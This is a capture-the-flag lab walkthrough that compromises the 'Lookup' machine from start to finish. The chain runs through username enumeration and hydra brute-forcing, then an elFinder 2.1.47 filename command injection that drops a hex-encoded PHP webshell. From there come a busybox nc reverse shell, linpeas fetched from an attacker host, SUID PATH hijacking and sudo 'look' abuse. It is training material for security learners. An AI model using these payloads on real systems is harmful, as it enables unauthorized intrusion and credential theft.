# Lookup - Easy

```sh
sudo vim /etc/hosts
# add lookup.thm

nmap -T4 -p- -A -Pn -v lookup.thm
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
    * 80/tcp - http - Apache httpd 2.4.41

* the webpage on port 80 gives a login page; attempting common creds does not help

* whenever we enter wrong creds, the page redirects to /login.php with the message wrong password, and redirects to index page in 3 seconds

* we can attempt command injection - to avoid the repeated timeout, intercept the login request in Burp Suite and send to Repeater

* we can also try command injection via fuzzing:

    ```sh
    ffuf -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -u 'http://lookup.thm' -X POST -d 'username=FUZZ&password=FUZZ' -fs 719 -s
    # we can try other wordlists
    ```

* command injection via fuzzing does not help, we can try using ```sqlmap``` to check for SQL injections - save the intercepted login request to a file for this:

    ```sh
    sqlmap -r lookup.req --batch --dump --level=5 --risk=3
    ```

* when we attempt a random username like 'test', we get the message 'wrong username or password'; when we use the 'admin' username, we get the message 'wrong password' - this means 'admin' is a valid username

* as we have an indicator for valid and invalid usernames, we can attempt to cover more valid usernames via fuzzing:

    ```sh
    ffuf -w /usr/share/seclists/Usernames/Names/names.txt -u 'http://lookup.thm' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=FUZZ&password=password' -mr 'Wrong password' -s
    # -mr to match regex/pattern
    # content-type header is required, otherwise login form does not work
    
    # this does not show even 'admin' as a valid username, so we need to modify our fuzzing
    # we can check with /login.php

    ffuf -w /usr/share/seclists/Usernames/Names/names.txt -u 'http://lookup.thm/login.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=FUZZ&password=admin' -mr 'Wrong password' -s
    # this works
    ```

* username fuzzing works with /login.php and we get an additional username 'jose'

* we can now attempt bruteforcing using ```hydra``` for 'admin' & 'jose':

    ```sh
    hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form '/login.php:username=^USER^&password=^PASS^:F=Wrong password'
    # start with 'jose'
    # this works
    ```

* ```hydra``` finds valid creds 'jose:password123' - we can now log into the webpage

* after logging in, the page redirects to 'files.lookup.thm' - we need to add this subdomain in ```/etc/hosts``` to proceed

* the webpage is a file manager interface titled 'files:elFinder', and the home page contains multiple '.txt' files, but most of them are protected

* we can click on 'preview' to check the content of these files

* most of the files seem to be randomly generated passwords; but we have a 'credentials.txt' file which includes 'think : nopassword' and 'thislogin.txt' mentioning 'jose : password123'

* checking the options provided in the interface, if we click on the blue question-mark icon, it shows the version of the web file manager software 'elFinder' as 2.1.47

* if we Google for elFinder 2.1.47 exploits, we get [CVE-2019-9194](https://www.exploit-db.com/exploits/46481) - a command injection exploit

* the exploit does not include options for cookies - as we had to login before being able to access the file manager - so we can edit the exploit code or attempt the exploit manually

* in this case, we can attempt the exploit manually:

    * in 'elFinder', upload a genuine image file
    
    * rename the image file with the given payload format - ```test.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > test.php;echo test.jpg```

    * the payload is a hex-encoded, PHP webshell one-liner, written to 'test.php'

    * after renaming the file, right-click on image file in elFinder and click on 'resize & rotate'

    * set the shown parameters to arbitrary values to trigger the operation; in this case, we can rotate the image by 180 degrees and click on 'apply' to submit the changes

    * after this is done, we can navigate to 'http://files.lookup.thm/elFinder/php/test.php?c=id' to verify the webshell RCE is working - we have RCE as 'www-data'

* for reverse shell, we can use one of the URL-encoded reverse shell one-liners - in this case, the payload ```busybox%20nc%20192.168.135.208%204444%20-e%20bash``` works:

    ```sh
    nc -nvlp 4444
    # setup listener

    # once payload is executed in webshell, we get reverse shell

    whoami
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # press Enter twice

    pwd
    # we are in one of the web directories

    cd /var/www

    ls -la
    # enumerate the web files

    ls -la /var/www/files.lookup.thm/public_html/elFinder
    # permission denied

    # but we have access to the 'php' subdirectory, where webshell is uploaded
    cd /var/www/files.lookup.thm/public_html/elFinder/php

    ls -la
    # enumerate files

    ls -la /home
    # we have 3 users - 'ssm-user', 'think' and 'ubuntu'
    ```

* from one of the files in 'elFinder' earlier, we got the creds 'think:nopassword' - this could be referring to the user 'think':

    ```sh
    su think
    # we can try 'nopassword' as well as no password by pressing Enter
    # both do not work

    # continue enumeration

    ls -la /home
    # we have read access to the user directories

    ls -la /home/ssm-user
    # nothing found

    ls -la /home/think
    # we do not have read access to sensitive files like '.passwords'

    ls -la /home/ubuntu
    # nothing found

    # we can use linpeas for enumeration - fetch script from attacker

    cd /tmp
    wget http://192.168.135.208:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * sudo version 1.8.31
    * unknown SUID & SGID binary ```/usr/sbin/pwm```

* we can check this binary further for privesc:

    ```sh
    /usr/sbin/pwm
    ```

* running the binary runs the ```id``` command and then prints the message '/home/www-data/.passwords not found'

* this means it is using the output of ```id``` to determine the location of the '.passwords' file - which explains why 'think' user has a '.passwords' file in their home directory

* we can abuse this flow by creating a malicious 'id' binary - which contains the output of the ```id``` command as the 'think' user - and making sure this malicious binary is referred by ```/usr/sbin/pwm```

* to do so, we also need to modify the PATH env var:

    ```sh
    cat /etc/passwd
    # note UID and GID values for 'think'

    id
    # note down 'id' output format

    cd /tmp

    echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' > id
    # use the same format, but replace the values for 'think'
    # and the binary should print the output, so we are using 'echo'

    chmod +x id

    export PATH=/tmp:$PATH

    echo $PATH
    # now, /tmp is added to the PATH var at the beginning itself
    # so the program flow will check for 'id' in '/tmp' first before the other binary paths like '/usr/sbin' and '/bin'

    /usr/sbin/pwm
    # this works
    ```

* the malicious binary works and it is able to read the '.passwords' file, and it prints a list of passwords

* we can copy the list of passwords to attacker, and attempt a SSH bruteforce with this wordlist for 'think':

    ```sh
    vim passwords.txt

    hydra -l think -P passwords.txt ssh://lookup.thm
    ```

* this works, and we get a valid pair of creds 'think:josemario.AKA(think)' - we can now login via SSH:

    ```sh
    ssh think@lookup.thm

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that we can run a binary ```/usr/bin/look``` as sudo

* checking [GTFObins](https://gtfobins.github.io/gtfobins/look/), we have an exploit available for this so we can use it:

    ```sh
    LFILE=/root/root.txt

    sudo /usr/bin/look '' "$LFILE"
    # this gives root flag
    ```
